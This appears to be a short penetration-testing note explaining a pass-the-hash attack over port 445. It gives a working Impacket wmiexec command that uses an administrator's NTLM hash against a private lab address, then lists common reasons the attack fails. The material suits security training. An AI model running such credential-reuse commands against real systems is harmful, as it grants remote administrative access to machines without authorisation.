#If the port 445 on the target machine is available and we found the NTLM hash for an administrator user we can try to perform a PtH attack with the following command using the Impacket collection utilities:


/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73

#If the attack doesn't work it may be for one or severals of the follwing reasons:
#
#	- A firewall is blocking the 445/tcp port connection.
#	- The users is not part of the Local Administrator group.
#	- The ADMIN$ share or the File and Printing share are not habilitated.
#
#This kind of attack can be launched with other tools.
